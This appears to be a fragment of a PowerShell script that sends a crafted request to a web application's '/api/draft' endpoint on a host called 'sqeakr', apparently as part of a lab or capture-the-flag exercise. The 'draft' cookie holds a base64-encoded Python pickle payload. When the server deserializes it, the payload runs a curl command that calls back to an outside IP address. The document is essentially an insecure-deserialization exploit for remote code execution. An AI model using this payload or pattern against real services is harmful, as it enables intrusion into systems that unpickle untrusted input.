...
$URI = [System.Uri]::new("http://sqeakr:80/api/draft")
...
$headers.Add("Origin", "http://sqeakr")
$headers.Add("Referer", "http://sqeakr/feed")
...
$webSession.Cookies.Add($URI, [System.Net.Cookie]::new("draft", "`"gASVPQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCJjdXJsIGh0dHA6Ly8xOTIuMTY4LjExOS4xMzAvZ290Y2hhlIWUUpQu`""))
$webSession.Cookies.Add($URI, [System.Net.Cookie]::new("HttpOnly; Path", "/"))
